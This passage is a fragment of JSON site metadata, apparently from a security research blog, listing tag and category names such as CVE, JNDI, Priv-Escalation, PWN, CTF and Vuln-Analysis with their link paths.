docker-compose.yml","link":"/Docs/DIPD-Document/"}],"tags":[{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"JNDI","slug":"JNDI","link":"/tags/JNDI/"},{"name":"CodeQL","slug":"CodeQL","link":"/tags/CodeQL/"},{"name":"C&amp;C++","slug":"C-C","link":"/tags/C-C/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Priv-Escalation","slug":"Priv-Escalation","link":"/tags/Priv-Escalation/"},{"name":"Format String","slug":"Format-String","link":"/tags/Format-String/"},{"name":"PWN","slug":"PWN","link":"/tags/PWN/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"Environment","slug":"Environment","link":"/tags/Environment/"}],"categories":[{"name":"Experience","slug":"Experience","link":"/categories/Experience/"},{"name":"Vuln-Analysis","slug":"Vuln-Analysis","link":"/categories/Vuln-Analysis/"},{"name":"Docs","slug":"Docs","link":"/categories/Docs/"}]}